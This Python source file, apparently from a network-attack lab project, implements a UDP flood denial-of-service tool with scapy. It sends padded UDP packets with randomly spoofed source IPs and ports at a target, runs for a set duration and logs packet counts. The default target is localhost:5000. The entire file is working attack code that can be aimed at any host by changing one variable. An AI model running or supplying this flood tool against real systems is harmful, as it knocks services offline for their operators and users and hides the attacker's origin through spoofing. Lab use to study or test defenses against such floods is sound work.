from scapy.all import UDP, IP, Raw, send
import random
import time
from datetime import datetime, timedelta
from logs.logger import setupLogger

# Initialize logger for this module
logger = setupLogger(__name__)

class UDPFloodAttack:

    #This type of attack sends numerous UDP packets to a target to consume bandwidth and resources.

    def __init__(self, target_ip, target_port, duration=10, rate=0.1):
    
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.rate = rate
        self.packets_sent = 0
        self.start_time = None
        
    def generatePacket(self):
        
        # random source IP address for IP spoofing
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        #  IP packet with UDP payload
        return IP(src=src_ip, dst=self.target_ip) / UDP(
            # Random source port
            sport=random.randint(1024, 65535),  
            dport=self.target_port
            # payload
        ) / Raw(load="X" * 1024), src_ip  
    
    def logStats(self):
        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            logger.info("\nAttack completed:")
            logger.info(f"Packets sent: {self.packets_sent}")
            logger.info(f"Duration: {duration:.2f} seconds")
            logger.info(f"Rate: {self.packets_sent/duration:.2f} packets/second")
    
    def start(self):
        """
        Start the UDP flood attack.
        Continuously sends packets for the specified duration or until interrupted.
        Handles keyboard interrupts gracefully and prints final statistics.
        """
        # Initialize attack start time and calculate end time
        self.start_time = datetime.now()
        end_time = self.start_time + timedelta(seconds=self.duration)
        
        logger.info(f"Starting UDP flood attack against {self.target_ip}:{self.target_port}")
        logger.info(f"Duration: {self.duration}s, Rate: {self.rate}s between packets")
        
        try:
            while datetime.now() < end_time:
                # Generate and send packet
                packet, src_ip = self.generatePacket()
                send(packet, verbose=False)
                self.packets_sent += 1
                
                if self.packets_sent % 100 == 0:  # Log every 100 packets to avoid flooding logs
                    logger.info(f"Sent {self.packets_sent} UDP packets to {self.target_ip}:{self.target_port}")
                time.sleep(self.rate)  # Control attack rate
                
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
        finally:
            # Always show stats when attack ends
            self.logStats()

# Script entry point
if __name__ == "__main__":
    # Default attack parameters
    target = 'localhost'
    port = 5000
    duration = 10
    rate = 0.1
    
    # Create and start the attack
    attack = UDPFloodAttack(target, port, duration, rate)
    attack.start()
